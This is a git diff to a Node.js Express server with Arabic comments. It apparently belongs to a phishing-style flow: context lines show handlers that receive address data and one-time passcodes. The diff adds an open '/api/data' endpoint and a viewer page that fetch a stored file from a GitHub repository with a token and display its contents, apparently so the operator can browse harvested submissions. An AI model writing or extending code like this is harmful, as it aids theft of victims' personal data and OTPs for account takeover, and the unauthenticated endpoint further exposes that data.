@@ -56,6 +56,28 @@ app.get('/page3', (req, res) => res.sendFile(path.join(__dirname, 'views', 'page
 app.get('/page4', (req, res) => res.sendFile(path.join(__dirname, 'views', 'page4.html')));
 app.get('/page5', (req, res) => res.sendFile(path.join(__dirname, 'views', 'page5.html')));
 
+// ========== صفحة عرض البيانات ==========
+app.get('/data-viewer', (req, res) => {
+    res.sendFile(path.join(__dirname, 'views', 'data-viewer.html'));
+});
+
+// ========== API لجلب البيانات ==========
+app.get('/api/data', async (req, res) => {
+    try {
+        const url = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}`;
+        const response = await fetch(url, { headers: { Authorization: `token ${GITHUB_TOKEN}` } });
+        if (response.ok) {
+            const fileInfo = await response.json();
+            const content = Buffer.from(fileInfo.content, 'base64').toString('utf8');
+            res.send(content);
+        } else {
+            res.send('');
+        }
+    } catch (e) {
+        res.send('');
+    }
+});
+
 // ========== استقبال بيانات العنوان ==========
 app.post('/submit-data', async (req, res) => {
     try {
@@ -159,4 +181,5 @@ app.post('/submit-otp', async (req, res) => {
 
 app.listen(PORT, () => {
     console.log(`✅ السيرفر شغال على port ${PORT}`);
+    console.log(`📊 صفحة عرض البيانات: http://localhost:${PORT}/data-viewer`);
 });
